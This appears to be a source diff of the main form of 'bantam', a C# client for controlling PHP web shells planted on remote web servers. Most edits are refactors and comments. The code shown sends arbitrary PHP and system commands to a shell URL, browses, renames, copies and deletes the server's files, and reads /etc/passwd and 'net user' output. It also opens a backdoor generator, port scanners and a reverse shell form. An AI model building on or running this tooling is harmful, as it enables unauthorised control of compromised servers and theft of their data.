@@ -16,7 +16,7 @@ namespace bantam
         /// <summary>
         /// Static instance accessor to our dynamic instance, todo look into making BantamMain static
         /// </summary>
-        public static BantamMain Instance{ get; private set;}
+        public static BantamMain Instance{ get; private set; }
 
         /// <summary>
         /// Full path and name of xml file if a file has opened (used for saving)
@@ -173,7 +173,7 @@ namespace bantam
                     result = Helper.DecodeBase64ToString(result);
                 }
 
-                result = result.Replace(PhpBuilder.rowSeperator, "\r\n");
+                result = result.Replace(PhpBuilder.responseDataRowSeperator, "\r\n");
 
                 if (!string.IsNullOrEmpty(prependText)) {
                     result = prependText + result + "\r\n";
@@ -188,9 +188,9 @@ namespace bantam
         }
 
         /// <summary>
-        /// 
+        /// Shell initialization routine. Connects with the shell, obtains default information for UI and backend, add's to listview if succeeds.
         /// </summary>
-        /// <param name="shellUrl"></param>
+        /// <param name="shellUrl">The Url of the Shell you are connecting too</param>
         public async Task InitializeShellData(string shellUrl)
         {
             if (string.IsNullOrEmpty(shellUrl) == false) {
@@ -205,7 +205,7 @@ namespace bantam
                     return;
                 }
 
-                var task = WebHelper.ExecuteRemotePHP(shellUrl, PhpBuilder.InitShellData(encryptResponse));
+                var task = WebRequestHelper.ExecuteRemotePHP(shellUrl, PhpBuilder.InitShellData(encryptResponse));
 
                 if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
                     ResponseObject response = task.Result;
@@ -216,14 +216,14 @@ namespace bantam
                             result = CryptoHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
                         }
 
-                        string[] data = result.Split(new [] { PhpBuilder.g_delimiter }, StringSplitOptions.None);
+                        string[] data = result.Split(new [] { PhpBuilder.responseDataSeperator }, StringSplitOptions.None);
                         
                         var initDataReturnedVarCount = Enum.GetValues(typeof(ShellInfo.INIT_DATA_VARS)).Cast<ShellInfo.INIT_DATA_VARS>().Max();
 
                         if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
                             AddShellToListView(shellUrl, pingWatch.ElapsedMilliseconds.ToString());
 
-                            Shells[shellUrl].Update(pingWatch.ElapsedMilliseconds, data);
+                            Shells[shellUrl].InitializeShellData(pingWatch.ElapsedMilliseconds, data);
                             Shells[shellUrl].Down = false;
 
                         } else {
@@ -250,7 +250,7 @@ namespace bantam
         private async static Task<string> ExecutePHPCode(string shellUrl, string phpCode, bool encryptResponse, int ResponseEncryptionMode)
         {
             string result = string.Empty;
-            var task = WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
+            var task = WebRequestHelper.ExecuteRemotePHP(shellUrl, phpCode);
 
             if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
                 ResponseObject response = task.Result;
@@ -282,7 +282,7 @@ namespace bantam
         #region GUI_EVENTS
 
         /// <summary>
-        /// 
+        /// Creates Useragent switcher Form and allows for changing of useragent
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -322,7 +322,7 @@ namespace bantam
                 if (checkBoxChecked) {
                     ExecutePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Eval Result - " + shellUrl, encryptResponse, ResponseEncryptionMode);
                 } else {
-                    await WebHelper.ExecuteRemotePHP(shellUrl, code);
+                    await WebRequestHelper.ExecuteRemotePHP(shellUrl, code);
                 }
             } else {
                 LogHelper.AddShellLog(shellUrl, "Attempted to eval empty code.", LogHelper.LOG_LEVEL.INFO);
@@ -385,7 +385,7 @@ namespace bantam
         }
 
         /// <summary>
-        /// Edits the PHP code of BANTAM that is stored online ! @dangerous
+        /// Edits the PHP code of BANTAM that is stored online ! @dangerous could lose access to your shell
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -650,17 +650,6 @@ namespace bantam
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void addToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            ModifyShell addClientForm = new ModifyShell();
-            addClientForm.Show();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
         private void listviewClientsContextMenu_Paint(object sender, PaintEventArgs e)
         {
             if (ValidTarget()) {
@@ -728,17 +717,6 @@ namespace bantam
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
-            backdoorGenerator.Show();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
         private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             SaveFileDialog saveShellsXMLDialog = new SaveFileDialog {
@@ -767,7 +745,6 @@ namespace bantam
                 if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                     foreach (ListViewItem lvClients in listViewShells.Items) {
                         if (Shells.ContainsKey(lvClients.Text)) {
-
                             Shells.TryRemove(lvClients.Text, out ShellInfo outShellInfo);
                         }
                         lvClients.Remove();
@@ -780,6 +757,100 @@ namespace bantam
             }
         }
         
+        /// <summary>
+        /// Enter Keydown Hadler for console input
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void textBoxConsoleInput_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter) {
+                btnConsoleGoClick_Click(sender, e);
+                e.Handled = true;
+                e.SuppressKeyPress = true;
+            }
+        }
+
+        /// <summary>
+        /// Enter Keydown handler for filebrowser path
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void txtBoxFileBrowserPath_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter) {
+                btnFileBrowserGo_Click(sender, e);
+
+                e.Handled = true;
+                e.SuppressKeyPress = true;
+            }
+        }
+
+        private void textBoxMaxCommentLength_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
+                e.Handled = true;
+            }
+        }
+
+        /// <summary>
+        /// Scrolls to the end of the Console Output Richtext box on update
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void richTextBoxConsoleOutput_TextChanged(object sender, EventArgs e)
+        {
+            richTextBoxConsoleOutput.SelectionStart = richTextBoxConsoleOutput.Text.Length;
+            richTextBoxConsoleOutput.ScrollToCaret();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void copyShellURLToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Clipboard.SetText(SelectedShellUrl);
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private async void btnConsoleGoClick_Click(object sender, EventArgs e)
+        {
+            if (ValidTarget() == false) {
+                return;
+            }
+
+            if (string.IsNullOrEmpty(textBoxConsoleInput.Text)) {
+                return;
+            }
+
+            btnConsoleGoClick.Enabled = false;
+
+            string cmd = textBoxConsoleInput.Text;
+            textBoxConsoleInput.Text = string.Empty;
+
+            string shellUrl = SelectedShellUrl;
+            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
+            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
+
+            string phpCode = PhpBuilder.ExecuteSystemCode(cmd, encryptResponse);
+            string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);
+
+            if (string.IsNullOrEmpty(result) == false) {
+                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\n" + result + "\r\n";
+            } else {
+                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\nNo Data Returned\r\n";
+            }
+
+            consoleTextboxAutoComplete.Add(cmd);
+            btnConsoleGoClick.Enabled = true;
+        }
+
         /// <summary>
         /// 
         /// </summary>
@@ -798,34 +869,65 @@ namespace bantam
         }
 
         /// <summary>
-        /// Enter Keydown Hadler for console input
+        /// 
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void textBoxConsoleInput_KeyDown(object sender, KeyEventArgs e)
+        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (e.KeyCode == Keys.Enter)
-            {
-                btnConsoleGoClick_Click(sender, e);
-                e.Handled = true;
-                e.SuppressKeyPress = true;
-            }
+            BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
+            backdoorGenerator.Show();
         }
 
         /// <summary>
-        /// Enter Keydown handler for filebrowser path
+        /// 
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void txtBoxFileBrowserPath_KeyDown(object sender, KeyEventArgs e)
+        private async void proxySettingsToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (e.KeyCode == Keys.Enter)
-            {
-                btnFileBrowserGo_Click(sender, e);
+            ProxyOptions proxyOptions = ProxyOptions.getInstance();
+            proxyOptions.ShowDialog();
+        }
 
-                e.Handled = true;
-                e.SuppressKeyPress = true;
-            }
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void addToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            ModifyShell addClientForm = new ModifyShell();
+            addClientForm.Show();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void portScannerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            PortScanner ps = new PortScanner(SelectedShellUrl);
+            ps.ShowDialog();
+        }
+
+        private void portScannerToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            DistributedPortScanner ds = new DistributedPortScanner();
+            ds.ShowDialog();
+        }
+
+        private void toolStripMenuItemReverseShell_Click(object sender, EventArgs e)
+        {
+            ReverseShell reverseShellForm = new ReverseShell(SelectedShellUrl);
+            reverseShellForm.ShowDialog();
+        }
+
+        private void optionsToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            Options optionsForm = new Options();
+            optionsForm.ShowDialog();
         }
 
         #endregion
@@ -926,12 +1028,17 @@ namespace bantam
                 return;
             }
 
-            string[] rows = result.Split(new [] { PhpBuilder.rowSeperator }, StringSplitOptions.None);
+            string[] rows = result.Split(new [] { PhpBuilder.responseDataRowSeperator }, StringSplitOptions.None);
 
             if (rows != null && rows.Length > 0) {
+                if (rows.Length > 1500) {
+                    LogHelper.AddGlobalLog("Too many files in directory to render, use reverse shell.", shellUrl, LogHelper.LOG_LEVEL.ERROR);
+                    return;
+                }
+
                 treeViewFileBrowser.BeginUpdate();
                 foreach (string row in rows) {
-                    string[] columns = row.Split(new [] { PhpBuilder.g_delimiter }, StringSplitOptions.None);
+                    string[] columns = row.Split(new [] { PhpBuilder.responseDataSeperator }, StringSplitOptions.None);
 
                     //todo clean up len check
                     if (columns != null && columns.Length - 2 > 0) {
@@ -1199,7 +1306,7 @@ namespace bantam
                 string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                 string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
 
-                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
+                await WebRequestHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
             }
         }
 
@@ -1223,7 +1330,7 @@ namespace bantam
 
             if (dialogResult == DialogResult.Yes) {
                 string phpCode = "@unlink('" + path + "');";
-                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
+                await WebRequestHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
             }
         }
 
@@ -1238,82 +1345,15 @@ namespace bantam
                 return;
             }
 
+
             string shellUrl = SelectedShellUrl;
             string fileName = fileBrowserGetFileNameAndPath();
             string newFileName = GuiHelper.RenameFileDialog(fileName, "Copying File");
 
             if (!string.IsNullOrEmpty(newFileName)) {
                 string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
-                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
+                await WebRequestHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);
             }
-        }
-
-        /// <summary>
-        /// Scrolls to the end of the Console Output Richtext box on update
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void richTextBoxConsoleOutput_TextChanged(object sender, EventArgs e)
-        {
-            richTextBoxConsoleOutput.SelectionStart = richTextBoxConsoleOutput.Text.Length;
-            richTextBoxConsoleOutput.ScrollToCaret();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private async void proxySettingsToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            ProxyOptions proxyOptions = ProxyOptions.getInstance();
-            proxyOptions.ShowDialog();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void copyShellURLToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            Clipboard.SetText(SelectedShellUrl);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private async void btnConsoleGoClick_Click(object sender, EventArgs e)
-        {
-            if (ValidTarget() == false) {
-                return;
-            }
-
-            if (string.IsNullOrEmpty(textBoxConsoleInput.Text)) {
-                return;
-            }
-
-            string shellUrl = SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
-            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
-
-            string cmd = textBoxConsoleInput.Text;
-            string phpCode = PhpBuilder.ExecuteSystemCode(textBoxConsoleInput.Text, encryptResponse);
-
-            string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);
-
-            if (string.IsNullOrEmpty(result) == false) {
-                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\n" + result + "\r\n";
-                textBoxConsoleInput.Text = string.Empty;
-            } else {
-                richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\nNo Data Returned\r\n";
-                textBoxConsoleInput.Text = string.Empty;
-            }
-
-            consoleTextboxAutoComplete.Add(cmd);
-
         }
 
         /// <summary>
@@ -1348,36 +1388,6 @@ namespace bantam
             }
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void portScannerToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            PortScanner ps = new PortScanner(SelectedShellUrl);
-            ps.ShowDialog();
-        }
-
-        private void portScannerToolStripMenuItem1_Click(object sender, EventArgs e)
-        {
-            DistributedPortScanner ds = new DistributedPortScanner();
-            ds.ShowDialog();
-        }
-
-        private void textBoxMaxCommentLength_KeyPress(object sender, KeyPressEventArgs e)
-        {
-            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
-                e.Handled = true;
-            }
-        }
-
-        private void toolStripMenuItemReverseShell_Click(object sender, EventArgs e)
-        {
-            ReverseShell reverseShellForm = new ReverseShell(SelectedShellUrl);
-            reverseShellForm.ShowDialog();
-        }
-
         #endregion
 
         #region OS_COMMANDS
@@ -1401,7 +1411,7 @@ namespace bantam
         }
        
         /// <summary>
-        /// 
+        /// Issues the windows "net user" command and displays the response
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -1500,6 +1510,7 @@ namespace bantam
         #endregion
 
         #region READ_COMMON_FILES
+
         /// <summary>
         /// 
         /// </summary>
@@ -1537,7 +1548,7 @@ namespace bantam
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void linusVersionMenuItem_Click(object sender, EventArgs e)
+        private void linuxVersionMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].ResponseEncryption;
@@ -1605,18 +1616,13 @@ namespace bantam
         {
             string shellUrl = SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].ResponseEncryption;
-            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_PasswdFile, Shells[shellUrl].ResponseEncryption);
             int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
+
+            string phpCode = PhpBuilder.ReadFileToBase64(PhpBuilder.linuxFS_PasswdFile, Shells[shellUrl].ResponseEncryption);
 
             ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpBuilder.linuxFS_PasswdFile, encryptResponse, ResponseEncryptionMode, true);
         }
 
         #endregion
-
-        private void optionsToolStripMenuItem_Click_1(object sender, EventArgs e)
-        {
-            Options optionsForm = new Options();
-            optionsForm.ShowDialog();
-        }
     }
 }
